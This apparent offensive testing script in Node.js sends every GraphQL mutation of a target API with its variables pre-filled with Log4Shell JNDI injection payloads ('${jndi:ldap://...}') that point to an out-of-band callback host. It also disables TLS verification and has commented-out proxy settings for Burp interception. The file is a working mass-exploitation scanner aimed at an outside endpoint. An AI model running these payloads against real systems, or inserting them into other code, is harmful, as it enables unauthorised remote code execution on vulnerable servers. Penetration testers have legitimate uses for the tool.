// process.env.GLOBAL_AGENT_HTTPS_PROXY="http://127.0.0.1:8080";
// process.env.NODE_EXTRA_CA_CERTS="/Users/jack/Documents/Burp/cert/key.pem";
process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0;

require("global-agent/bootstrap")

const gql  = require('graphql-tag');
const { GraphQLClient } = require('graphql-request');

// Parse your schema with

const mutations = require('../gqlg/mutations');

// Choose your target

const target = 'https://ex.ru/graphql/';

// Setting your headers

const client = new GraphQLClient(target, {
    headers: {
      // authorization: 'Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.//',
      // Cookie: 'access_token=...;'
    }
});

// Set your presets parameters

const presetsForTypes = {
    'String' : '${jndi:ldap://log4shell.f31cc98c.ex.me/a}',
    'Boolean' : true,
    'Int' : 1,
    'uuid':'b84d9247-34f7-43ef-b4e5-e32ca62223a5',
    'Float' : 1.1,
    'ID' : 'b84d9247-34f7-43ef-b4e5-e32ca62223a5', //13813264
    'DateTime' : '2022-01-09T11:54:42',
    'Date' : '2022-01-09',
    'URI' : 'http://ex.com/${jndi:ldap://f31cc98c.ex.me/a}'
};

//Also you can chose preset for your specific variables

const presetsForNames = {
    'email' : '"${jndi:ldap://f31cc98c.ex.me/a}"@b588dc1f.ex.me',
    'phone' : '79991231212',
    'number': '79991231212'
}
try {

    Object.keys(mutations).forEach((mutation)=>{

        var variables = {};
        // console.log(mutations[mutation]);
        var gqlRequest = gql(mutations[mutation]);

        gqlRequest.definitions[0].variableDefinitions.forEach((variable)=> {
            if (variable.variable.name.value.toLowerCase() in presetsForNames){
                
                variables[variable.variable.name.value] = presetsForNames[variable.variable.name.value.toLowerCase()]
            } else {
                var type_obj = variable.type;
                while(true){
                    if (type_obj.name !== undefined){
                        variables[variable.variable.name.value] = presetsForTypes[type_obj.name.value];
                        break;
                    } else {
                        type_obj = type_obj.type;
                    }
                }
            }

        });

        // Sending the request and handling exceptions

        client.request(mutations[mutation], variables)
            .then((data)=> console.log("Made request:" + mutation))
            .catch(error => console.log("Error occurred: "+ error.message + "\n"+"-".repeat(40)));

    })
} catch (e) {
  if (e !== 'Break') throw e
}